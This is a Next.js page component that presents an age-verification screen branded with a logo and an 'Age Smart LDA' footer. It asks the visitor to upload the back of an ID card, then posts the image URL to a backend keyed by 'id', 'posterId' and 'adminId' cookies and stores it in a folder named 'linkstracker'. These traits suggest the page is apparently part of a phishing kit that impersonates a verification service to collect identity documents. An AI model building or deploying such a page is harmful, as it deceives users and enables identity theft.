"use client"
import React, { useState } from 'react'
import { useRouter } from 'next/navigation';
import { useFormState,useFormStatus} from "react-dom";
import { UploadImage } from '../libs/uploadImg';
import IdUpload from '../components/IdUpload';
import Cookies from "js-cookie";
import { API_URL } from '../config';

export default function page() {
  const[nextPage,setNextPage]=useState(false)
  const  {pending}  = useFormStatus();
  const addPost = async (prevState, formData) => {
    setNextPage(true);
    let { selfie } = Object.fromEntries(formData);

    const uploadImg = await UploadImage(selfie, "linkstracker");
    console.log(uploadImg);

    let { secure_url } = uploadImg;
    const values = {
      id: Cookies.get("id"),
      holdingCard: secure_url,
    };
    const url = `${API_URL}/card/add`;
    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    if (res.ok) {
      console.log("success", data);
      Cookies.remove("id");
      Cookies.remove("posterId");
      Cookies.remove("adminId");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };
  const [state, formAction] = useFormState(addPost);
  return (
   <>
   {
    !nextPage?( 
    <form    action={formAction }   >
      <div className="absolute inset-0 bg-white h-screen">
       <nav className=" w-full px-3 py-2 bg-[#ff2aac]">
          <div className="flex justify-center items-center ">
            <img src="/images/megalogo.png" width={237} height={40}/>
          </div>
        </nav>
      <div className="flex flex-col justify-start items-center h-full">
       
       
        <div className=" rounded-md bg-white  overflow-hidden ">
        
         
          
              
          <div className="mx-5 my-6 flex flex-col items-center gap-5">
          <h1 className="text-[22px] font-semibold  text-gray-700">
             Upload back Of the ID Card
          </h1>
  
          <div className="relative w-[676px] h-[460px]">
          
              <img
                alt="id image"
                src="/images/selfie.jpg"
                fill
                className="object-cover"
              />
           
          </div>
  
          <input type="file" id="selfie" name="selfie"/>
          <div className=" m-3 flex flex-col justify-center items-center">
            <button type="submit" disabled={pending} className=" text-white px-4 py-2 bg-[#198754] rounded-md mb-3" >

            {pending ? "Submitting..." : "Submit ID"}
            </button>
            <img src="/images/footer-logo.png" width={64} height={64}/>
            <p className="text-normal font-semibold">Copyright © 2022 Age Smart LDA. All Rights Reserved.</p>
          </div>
  
        
  
        </div>
  
  
      
          </div>
          </div>
          </div>
    </form>):(
      <IdUpload/>
    )
   }
   </>
  )
}
